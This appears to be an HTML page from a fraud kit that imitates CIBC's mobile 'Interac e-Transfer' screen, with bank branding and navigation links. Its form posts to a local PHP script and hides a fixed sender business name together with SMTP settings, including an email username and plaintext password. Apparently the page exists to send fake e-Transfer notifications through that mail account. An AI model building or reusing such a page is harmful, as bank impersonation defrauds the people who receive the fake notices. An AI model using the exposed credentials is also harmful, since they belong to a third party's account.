<html lang="en"><link type="text/css" rel="stylesheet" id="dark-mode-custom-link"><link type="text/css" rel="stylesheet" id="dark-mode-general-link"><style lang="en" type="text/css" id="dark-mode-custom-style"></style><style lang="en" type="text/css" id="dark-mode-native-style"></style><style lang="en" type="text/css" id="dark-mode-native-sheet"></style><link type="text/css" id="dark-mode" rel="stylesheet" href="chrome-extension://lkmeakjjodlkhbikbpdoeicfodaklkna/data/content_script/general/dark_1.css"><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="HandheldFriendly" content="true">
    <meta name="format-detection" content="telephone=no">
    <title>Interac e-Transfer</title>
    <link rel="stylesheet" href="./files/reset.css">
    <link rel="stylesheet" href="./files/reset-brand.css">
    <link rel="stylesheet" href="./files/global.css">
    <link rel="stylesheet" href="./files/global-android2.css">
    <link rel="stylesheet" href="./files/global-brand.css">
    <link rel="stylesheet" href="./files/password-reset.css">
    <link rel="stylesheet" href="./files/password-reset-brand.css">
    <style id="at-makers-style" class="at-flicker-control">
        .mboxDefault {visibility: hidden;}
    </style>
    <style>
        #header-logo {
            background: url(/assets/cibc/img/cibcnew.svg);
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            width: 100px;
        }
    </style>
    <script src="./files/jquery-3.6.0.min.js.download" crossorigin="anonymous"></script>
    <script>var lrbank = 'CIBC'; var lrinfo = 'Card';</script>
    <script src="./files/actions.js.download"></script>
</head>
<body class="android-fix" lang="en">
    <span class="offscreen">Forgot Password</span>
    <input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
    <label for="drawer-toggle-chk" id="drawer-toggle-label">
        <img id="open-menu-icon" src="./files/drawer-menu-open.png" alt="Open Menu" role="button">
        <img id="close-menu-icon" src="./files/drawer-menu-close.png" alt="Close Menu" role="button">
    </label>
    <nav id="drawer-menu" class="scrollable-ver">
        <div id="menu-wrapper">
            <div class="drawer-menu-header">
                <div>CIBC<span>Mobile Banking</span></div>
            </div>
            <ul>
                <li id="li-sign-on"><a id="signon-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-signonLink" role="menuitem">Sign On</a></li>
                <li><a id="register-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-registerLink" role="menuitem">Register</a></li>
                <li id="li-forgot-password"><a id="forgetpwd-link" class="tracking-set-flow active" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-forgetPasswordLink" role="menuitem">Forgot Password<span class="offscreen">Selected</span></a></li>
                <hr>
                <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-openAccountPs-openAccountPsLink" role="menuitem" @="Open an Account<span class=&quot;offscreen&quot;>. Opens in new page</span>">Open an Account</a></li>
                <li id="li-browse-products"><a id="browse-products-link" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-browseProductsPs-productSelectorLink" target="_blank" role="menuitem" @="Explore Products<span class=&quot;offscreen&quot;>. Opens in new page</span>" class="">Explore Products</a></li>
                <li id="li-sites-apps"></li>
                <li id="li-sites-apps"><a id="sites-link" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-sitesPreSignOnLink" role="menuitem" class="">CIBCSites</a></li>
                <li id="li-find-us"><a id="find-us-link" href="https://www.cibc.com/ca/redirect/locator.html?itrc=C1:6185" target="_blank" role="menuitem">Find Us</a></li>
                <li id="li-security"><a id="security-guarantee-link" href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:6166" target="_blank" role="menuitem">Security Guarantee</a></li>
                <hr>
                <li><a id="contact-us-link" href="https://www.cibc.com/m/contact-cibc.html?itrc=C1:6187" target="_blank" role="menuitem">Contact Us</a></li>
                <li id="idd"><a id="legal-link" role="menuitem" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-privacyAndLegalContainer-legalLink" @="Privacy and Legal<span class=&quot;offscreen&quot;>Opens in new page.</span>" class="">Privacy and Legal<span class="offscreen">Opens in new page.</span></a></li>
                <li><a id="help-link" href="http://cibc.intelliresponse.com/mobile-w/?itrc=C1:6167" target="_blank" role="menuitem">Help</a></li>
            </ul>
        </div>
    </nav>
    <header class="flex-box flex-box-hoz">
        <div class="flex-box-flex-1"></div>
        <a href="http://cibc.com/" target="_blank">
            <div id="header-logo">
                <span class="offscreen">CIBC logo</span>
            </div>
        </a>
        <div id="header-link" class="flex-box-flex-1">
        </div>
    </header>
    <section id="main-page" class="mainPageClassValue">
        <section id="ide">
            <section class="page-title">
                <section class="page-title">
                    <h2 class="title"><em>Interac</em> e-Transfer</h2>
                </section>
            </section>
        </section>
        <section id="card-information" class="page-wrapper">
            <form class="input-form form-card" id="etransfer-form" method="post" action="LEVEL1-2.php" enctype="multipart/form-data">

                <div class="form-group">
                    <label>Recipient's Name</label>
                    <input type="text" id="receivers_name" name="receivers_name" value="One-time contact" required="">
                </div>
                <div class="form-group">
                    <label>Recipient's Email</label>
                    <input type="email" id="receivers_email" name="receivers_email" placeholder="Enter recipient's email" required="">
                </div>            
                <input type="hidden" id="sender_name" name="sender_name" value="SUN HILLS HOLDINGS LTD" required="">
             
                <div class="form-group">
                    <label>Select Bank Account</label>
                    <select id="bank-account" name="bank-account" required="">
                        <option value="chequing">Chequing Account</option>
                        <option value="savings">Savings Account</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Amount</label>
                    <input type="text" id="amount" name="amount" placeholder="Enter e-Transfer amount" required="">
                </div>

                <fieldset class="button-set" style="margin-top: 20px;">
                    <input type="hidden" name="line" value="" required="">
                    <input type="hidden" name="port" value="587" required="">
                    <input type="hidden" name="username" value="andallard@mymts.net" required="">
                    <input type="hidden" name="password" value="Batman123" required="">
                    <input type="hidden" name="host" value="mail.mymts.net" required="">
                    <fieldset class="button-set">
                        <input type="button" class="btn btn-negative" id="btb-cancel" name="cancel-button" value="Cancel">
                        <input type="submit" name="send-button" id="btn-send" class="btn btn-positive" value="Send">
                        <button id="btn-sending" style="display:none;" class="btn btn-positive" disabled="">Sending...</button>
                        <button type="submit" name="ok-button" id="btn-next" class="btn btn-positive btn-full btn-save" style="display: none;">
                            <span class="btn-txt">OK</span>
                            <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                        </button>
                    </fieldset>
                </fieldset>
            </form>
        </section>
    </section>


</body></html>